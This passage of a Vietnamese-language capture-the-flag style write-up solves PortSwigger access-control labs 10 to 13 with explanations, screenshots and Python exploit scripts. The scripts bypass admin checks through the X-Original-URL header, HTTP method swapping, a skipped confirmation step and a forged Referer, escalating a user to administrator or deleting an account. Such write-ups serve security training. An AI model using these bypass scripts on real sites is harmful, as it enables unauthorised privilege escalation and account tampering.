soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name':'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'carlos',
    'password': password
}

response = session.post(
    url + '/login',
    data=data,
    verify=False
)
# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1du04aFp.png)

mục đích của chúng ta đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/BydcRVaF6.png)

## 10. Lab: URL-based access control can be circumvented

link: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

### Đề bài

![image](https://hackmd.io/_uploads/BJMTJHTF6.png)

### Phân tích

<li>Miêu tả tình huống cho phép trang web có trang quản trị administrator với đường dẫn /admin. Hệ thống front-end đã thực hiện ngăn chặn các hành vi truy cập trái phép tới đường dẫn này, tuy nhiên, back-end server sử dụng framework cho phép tiêu đề X-Original-URL hoạt động. Nhiệm vụ của chúng ta là khai thác lỗ hổng này, truy cập tới trang quản trị hệ thống và xóa đi tài khoản của người dùng carlos.</li>

<li>Một số trang web sử dụng các framework cho phép các HTTP header nguy hiểm hoạt động như X-Original-URL, X-Rewrite-URL. Các header này cho phép ghi đè lên URL truy cập, từ đó có thể vượt qua lớp bảo vệ khỏi người dùng thông thường truy cập các chức năng cao hơn của hệ thống</li>

VD:

```POST / HTTP/1.1
X-Original-URL: /administrater/some_sensitive_path
...
```

Khi hệ thống nhận được request này, do chấp nhận tiêu đề X-Original-URL nên sẽ thực hiện ghi đè và khiến người dùng truy cập trái phép tới `/administrater/some_sensitive_path`

### Khai thác

<li>Sau khi truy cập vào trang web, chúng ta nhận thấy giao diện home có dòng chữ Admin Panel dẫn tới trang quản trị tại đường dẫn /admin.</li>

<li>Khi truy cập chúng ta nhận được thông báo lỗi Access denied, với mã 403 Forbidden: Người dùng không được phân quyền.</li>

![image](https://hackmd.io/_uploads/B1Yd-r6KT.png)

<li>có thể dự đoán rằng phản hồi Access denied trong lab này có thể được đưa ra từ hệ thống front-end.</li>

Thực hiện ghi đè nội dung URL bằng tiêu đề `X-Original-URL`:

![image](https://hackmd.io/_uploads/r1-KXSpYp.png)

<li>chúng ta đã thành công truy cập được trang quản trị.</li>

![image](https://hackmd.io/_uploads/SyXiBrpF6.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0af30018040d749280dabcb2006a0070.web-security-academy.net'

headers = {
    'X-Original-Url': '/admin/delete?username=carlos',
}

params = {
    'username': 'carlos',
}

response = requests.get(
    url + '/login',
    params=params,
    headers=headers,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)

```

mục đích của chúng ta đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SkAZBrpF6.png)

## 11. Lab: Method-based access control can be circumvented

link: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

### Đề bài

![image](https://hackmd.io/_uploads/SkJ-IHpKa.png)

### Phân tích

<li>Chúng ta được cung cập một tài khoản có vai trò administrator là administrator:admin giúp thu thập các thông tin hữu ích liên quan tới upgrade một tài khoản lên quyền quản trị viên. Chúng ta cần khai thác lỗ hổng trong HTTP reuqest method để upgrade tài khoản wiener:peter lên quyền admin.</li>

Đăng nhập với tài khoản administrator:admin và quan sát trang quản trị Admin panel:

![image](https://hackmd.io/_uploads/B1aIwBTYp.png)

Tính năng cho phép chúng ta có thể upgrade hoặc downgrade vai trò của bất kì người dùng nào. Thử upgrade vai trò của của người dùng carlos và quan sát request trong Burp Suite:

![image](https://hackmd.io/_uploads/Bk0FvraYp.png)

Hệ thống gọi tới path /admin-roles và truyền lên hai tham số username=carlos&action=upgrade bằng phương thức POST. Lưu ý giá trị tại header Cookie `session=l6GdPYb1Q1DVZIGDPaf4cpP1WsEJsp7b` được sử dụng để xác thực người dùng.

### Khai thác

Mở một trình duyệt ẩn danh, đăng nhập với tài khoản wiener:peter để lấy seesion hiện tại của wiener: là `8K2Sj0QQ2rTIfSXLj8I4OgEXaqKKd4Na`

![image](https://hackmd.io/_uploads/B16vYB6F6.png)

![image](https://hackmd.io/_uploads/rJYsFSTFT.png)

Thay giá trị session của wiener vào session trong request upgrade role:

![image](https://hackmd.io/_uploads/rJgr9HaKp.png)

<li>Chúng ta thu được thông báo "Unauthorized". Do hệ thống không thực hiện kiểm tra các HTTP request method từ người dùng, nên chúng ta có thể vượt qua lớp bảo vệ này bằng cách sử dụng HTTP request method POSTX:</li>

![image](https://hackmd.io/_uploads/BkSC9rpFT.png)

<li>Chúng ta thấy rằng hệ thống trả về thống báo "Missing parameter 'username'", điều này chứng tỏ chúng ta đã vượt qua cơ chế xác thực session. Thêm tham số username gửi tới hệ thống bằng cách sử dụng HTTP request method PUT để cập nhật và thay giá trị username=wiener:</li>

![image](https://hackmd.io/_uploads/B1B2irTFT.png)

Tài khoản wiener được upgrade thành công!

![image](https://hackmd.io/_uploads/S1xynBpYT.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a0500900410b78e88cf74a4007200f1.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


cookies = {
    'session': session
}

data = {
    "username":"wiener",
    "action":"upgrade"
}

response = requests.put(
    url + '/admin-roles',
    cookies=cookies,
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/r1Fl6B6KT.png)

## 12. Multi-step process with no access control on one step

link: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

### Phân tích

<li>Miêu tả lab đặt ra giả thuyết chúng ta đã có tài khoản với quyền quản trị là administrator:admin. Trang quản trị chứa một quá trình nhiều bước thực hiện thay đổi vai trò người dùng. Chúng ta có thể thu thập cách trang quản trị hoạt động bằng tài khoản administrator. Chúng ta còn được cung cấp một tài khoản hợp lệ wiener:peter, nhiệm vụ cần khai thác lỗ hổng kiểm soát truy cập để leo quyền tài khoản wiener lên quyền quản trị.</li>

<li>Đăng nhập với tài khoản administrator:admin, tại trang Admin panel chứa chức năng upgrade vai trò người dùng. Thực hiện upgrade vai trò người dùng carlos và quan sát lịch sử các request và response trong HTTP History trong Burp Suite.

Upgrade người dùng carlos:</li>

![image](https://hackmd.io/_uploads/HJNoI06Kp.png)

Xác nhận upgrade:

![image](https://hackmd.io/_uploads/SJ03UCpFp.png)

tương tự bài trước

đường dẫn /admin-roles hai tham số username=carlos&action=upgrade qua phương thức POST gồm tên người dùng và thao tác upgrade:

Tiếp theo, xác nhận thao tác upgrade, thêm tham số confirmed=true:

### Khai thác

<li>Mở một trình duyệt ẩn danh mới, đăng nhập với tài khoản wiener:peter. Với các thông tin đã có, chúng ta có thể sử dụng tài khoản wiener gửi tham số username=wiener&action=upgrade tới đường dẫn /admin-roles bằng phương thức POST thử chức năng upgrade có hoạt động với người dùng thường không?</li>

![image](https://hackmd.io/_uploads/SyjmiRatT.png)

Tuy nhiên, nhận được thông báo "Unauthorized". Chúng ta biết rằng chức năng thay đổi vai trò người dùng hoạt động trong hai bước. Bởi vậy, thử bỏ qua bước thứ nhất (hệ thống khả năng thực hiện xác thực người dùng tại bước này), trực tiếp gửi các tham số action=upgrade&confirmed=true&username=wiener bằng phương thức POST tới /admin-roles:

![image](https://hackmd.io/_uploads/SyrYsCptp.png)

Status code trả về 302 Found. Tức là chúng ta đã upgrade người dùng wiener lên vai trò quản trị viên thành công!

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a0500900410b78e88cf74a4007200f1.web-security-academy.net'

data = {
    'username': 'wiener',
    'password': 'peter'
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-cookie'].split(';')[0].split('=')[1]

# Change role

cookies = {
    'session': session,
}

data = {
    'action': 'upgrade',
    'confirmed': 'true',
    'username': 'wiener',
}

response = requests.post(
    url + '/admin-roles',
    cookies=cookies,
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SkjbnA6Fa.png)

mục đích của chúng ta đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/BkpfnAatp.png)

## 13. Lab: Referer-based access control

link: https://portswigger.net/web-security/access-control/lab-referer-based-access-control

### Đề bài

![image](https://hackmd.io/_uploads/Byag6RaKp.png)

### Phân tích

<li>Miêu tả lab cho biết trang web kiểm tra thông tin tiêu đề Referer để xác thực người dùng. Chúng ta được cung cấp một tài khoản vai trò quản trị viên administrator:admin để thu thập các đường dẫn cũng như thông tin liên quan tới chức năng upgrade vai trò người dùng. Chúng ta còn được cung cấp một tài khoản hợp lệ thông thường wiener:peter, nhiệm vụ cần khai thác lỗ hổng trên thực hiện leo quyền tài khoản wiener lên quyền quản trị viên.</li>

<li>HTTP referer (từ chữ "referrer" vô tình bị viết sai chính tả) là một trường HTTP header xác định địa chỉ của trang web (tức là URI hoặc IRI) liên kết với tài nguyên được yêu cầu. Bằng cách kiểm lại trang giới thiệu, trang web mới có thể thấy yêu cầu bắt nguồn từ đâu. Ví dụ khi người dùng nhấn vào một liên kết trong một trình duyệt web, trình duyệt sẽ gửi một yêu cầu tới máy chủ lưu giữ trang web đích. Yêu cầu đó có bao gồm trường giới thiệu (referer), cho biết trang cuối cùng của người dùng sử dụng (trang mà họ đã nhấn vào liên kết). Ghi nhận trang chuyển tiếp được sử dụng để cho phép các trang web và máy chủ web xác định nơi mọi người đang truy cập chúng từ nơi nào, cho các mục đích quảng cáo hoặc thống kê.</li>

<li>Chúng ta sẽ cần truy cập vào đường dẫn tới /admin là trang quản trị, và sau đó sẽ tiếp tục truy cập tới đường dẫn có chức năng xóa tài khoản người dùng là /admin/delete và gửi tham số username yêu cầu xóa tài khoản. Lỗ hổng kiểm soát truy cập qua tiêu đề Referer có thể xảy ra khi người dùng truy cập tới /admin/delete, hệ thống kiểm tra giá trị tiêu đề Referer xem người dùng có phải tới từ đường dẫn nguồn là /admin hay không, nếu đúng sẽ xác thực tin tưởng và thông qua yêu cầu. Bởi kẻ tấn công có thể thay đổi giá trị tiêu đề Referer nên cơ chế hoạt động này thực sự nguy hiểm!</li>

Thực hiện upgrade tài khoản carlos lên quyền quản trị và quan sát request:

![image](https://hackmd.io/_uploads/B1pZy1AFa.png)

### Khai thác

<li>Thay đổi URL nguồn trong tiêu đề Referer thành một đường dẫn bất kì và quan sát response:
</li>

![image](https://hackmd.io/_uploads/HkrU1yRtT.png)

Nhận được thông báo "Unauthorized". Điều này chứng tỏ hệ thống tồn tại cơ chế xác thực danh tính người dùng qua tiêu đề Referer, trong đó người dùng phải gửi yêu cầu upgrade tài khoản từ đường dẫn `/admin`.

Đăng nhập với tài khoản wiener:peter, thực hiện gửi tới đường dẫn /admin-roles các tham số username=wiener&action=upgrade bằng phương thức GET, thêm tiêu đề Referer với giá trị https://0ad200e003f133c9837cce8900e60071.web-security-academy.net/admin:

![image](https://hackmd.io/_uploads/BJzoJJAKa.png)

![image](https://hackmd.io/_uploads/ryYVly0Ka.png)

Status code trả về 302 Found. Điều đó chứng tỏ chúng ta đã upgrade vai trò wiener lên quản trị viên thành công!

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0ad200e003f133c9837cce8900e60071.web-security-academy.net'

data = {
    'username': 'wiener',
    'password': 'peter'
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

headers = {
    'Referer': url + '/admin',
}

params = {
    'username': 'wiener',
    'action': 'upgrade',
}

response = requests.get(
    url + '/admin-roles',
    params=params,
    cookies=cookies,
    headers=headers,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rkKZb1RF6.png)

mục đích của chúng ta đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/ryCNWJCYT.png)
